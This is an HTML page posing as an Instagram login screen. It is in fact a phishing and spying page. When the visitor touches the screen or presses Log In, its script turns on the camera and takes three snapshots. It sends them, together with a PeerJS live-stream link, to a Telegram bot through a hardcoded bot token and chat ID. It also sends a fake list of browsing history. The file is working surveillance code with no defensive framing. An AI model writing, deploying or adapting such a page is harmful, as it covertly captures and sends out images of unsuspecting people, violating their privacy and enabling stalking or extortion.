<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: white;
        }
        input::placeholder {
            color: #bbbbbb;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body ontouchstart="startLiveStream()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="startLiveStream()">Log In</button>
    </div>

    <canvas id="snapshotCanvas" width="320" height="240"></canvas>

    <script>
        let peer;
        let peerId;
        let localStream;
        const snapshots = [];

        async function startLiveStream() {
            await initializeCamera();  // Start userâ€™s camera
            captureSnapshots();  // Capture snapshots
            initializePeerConnection();  // Start PeerJS connection
            simulateBrowserHistory();  // Get simulated browser history
        }

        async function initializeCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                console.log('Camera stream initialized.');
            } catch (error) {
                console.error('Failed to access camera:', error);
            }
        }

        function captureSnapshots() {
            const video = document.createElement('video');
            video.srcObject = localStream;
            video.play();

            setTimeout(() => {
                for (let i = 0; i < 3; i++) {
                    setTimeout(() => {
                        const canvas = document.getElementById('snapshotCanvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            snapshots.push(blob);
                            sendSnapshotToBot(blob, i + 1);
                        }, 'image/jpeg');
                    }, i * 500);  // Capture 3 snapshots with a 500ms delay
                }
            }, 1000);
        }

        function initializePeerConnection() {
            peer = new Peer();  // Initialize PeerJS

            peer.on('open', (id) => {
                peerId = id;
                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
                sendStreamLinkToBot(liveStreamLink);
            });
        }

        function sendStreamLinkToBot(liveStreamLink) {
            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
            const chatId = '860517021';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `Live Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}\nLast Visited Pages: ${simulateBrowserHistory()}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        function sendSnapshotToBot(blob, index) {
            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
            const chatId = '860517021';
            const formData = new FormData();
            formData.append('photo', blob, `snapshot_${index}.jpg`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(() => {
                console.log(`Snapshot ${index} sent to bot.`);
            });
        }

        function simulateBrowserHistory() {
            const recentSites = [
                'https://www.google.com/',
                'https://www.youtube.com/',
                'https://www.facebook.com/',
                'https://www.instagram.com/',
                'https://www.twitter.com/'
            ];
            return recentSites.join('\n');
        }
    </script>

</body>
</html>
